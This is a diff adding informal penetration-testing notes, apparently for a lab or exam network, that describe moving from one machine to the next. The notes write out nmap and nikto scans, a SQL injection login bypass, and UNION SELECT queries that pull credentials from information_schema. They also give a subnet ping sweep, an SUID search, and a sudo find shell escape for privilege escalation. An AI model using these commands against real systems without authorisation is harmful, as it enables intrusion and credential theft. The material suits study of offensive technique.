@@ -1,0 +1,45 @@
+start with 1 ip address ;; nmap -Pn -T4 --min-rate 10000000000 <IP> -p20-23,80,8080 
+navigate to website, surf site and look for links (if theres a WALL OF TEXT theres probably something in there) 
+nikto -h <webiste IP> 
+run nmap -Pn -T5 -sT -p 80 --script http-enum.nse <ip>
+sign in page >> sql injection 
+    >>username: 'or 1='1 
+    >>password: 'or 1='1
+go to network tab and peep the post request, copy and paste into the url bar after a "?". veiw page source and you should see creds
+log into machine cat out /etc/hosts, sudo -l, ip neigh, for i in i script...
+
+prive esc:
+sudo -l, 
+find / -type file -perm /4000 2>/dev/null (GTFO bins)
+which gdb
+
+no escalation was foudn on this box fuck 
+
+find next jump and run scans for http,ssh,vuln...
+
+exploit vuln http ports on current (2nd) machine 
+sql injection:
+see radio buttons which lead to a table/chart
+no post request so edit url "selection" or "catagory" integers/strings to find an exploitable sql table 
+  >>pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+                     ^ edit this selection until smth pops up
+  >>pick.php?product=7 UNION SELECT 1,2,3 (on test it will be up and down in a single column not in the rows)
+  >>UNION SELECT x,y,z from leftcolumn.rightcolumn
+  find creds through tables and columns 
+  use creds to crack (or not crack) into machine;; if creds dont work, move on 
+  use for i in {1..254} ;do (ping -c 1 192.168.1.$i 2>/dev/null | grep "bytes from" &) ;done    to find reliable connections or next jumps 
+  
+  use previous creds to crack into the thrid target
+  priv esc:
+  sudo -l 
+  which gdb 
+  find / -type file perm /4000 2>/dev/null (GTFO bins)
+  sudo find . -exec /bin/sh \; -quit 
+  
+  
+  find next jump;;
+widnows!!!!
+port 3389,9999
+if 9999 is open, netcat for secure server 
+buffer overflow::::
+
